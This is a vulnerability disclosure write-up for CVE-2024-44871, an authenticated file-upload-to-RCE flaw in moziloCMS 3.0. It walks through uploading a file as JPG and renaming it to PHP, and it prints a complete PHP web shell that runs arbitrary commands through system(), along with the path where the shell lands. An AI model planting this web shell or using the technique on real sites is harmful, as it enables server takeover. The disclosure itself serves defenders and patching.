## **CVE-2024-44871: File upload vulnerability to RCE in Mozilo V.3.0**


### **Summary**

An arbitrary file upload vulnerability exists in moziloCMS v3.0 within the /admin/index.php component. This vulnerability allows attackers to execute arbitrary code by uploading a maliciously crafted .JPG file and subsequently renaming its extension to .PHP using the application's renaming function.

***Discovered by Olaoluwa aka Secfortress, September 2024.***

### **Writeup**

Log in to website as admin

![](https://i.imgur.com/afs7YYh.png)


Navigate to files and then click the upload icon ;


![](https://i.imgur.com/dj53uwd.png)



Save the following PHP code into a file named `rev.php.jpg` file and upload it to the website


```PHP
<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd']);
    }
?>
</pre>
</body>
<script>document.getElementById("cmd").focus();</script>
</html>
```


Save the file and rename to `rev.php` then the [Enter] key on your keyboard


![](https://i.imgur.com/h0U8FEm.png)



Uploaded files are stored at `/kategorien/Willkommen/dateien/`, so Navigate to the following URL on localhost to get RCE ;


[http://127.0.0.1/mozilo3.0-3.0.1/kategorien/Willkommen/dateien/rev.php](http://127.0.0.1/mozilo3.0-3.0.1/kategorien/Willkommen/dateien/rev.php)


![](https://i.imgur.com/yjvhTHF.png)
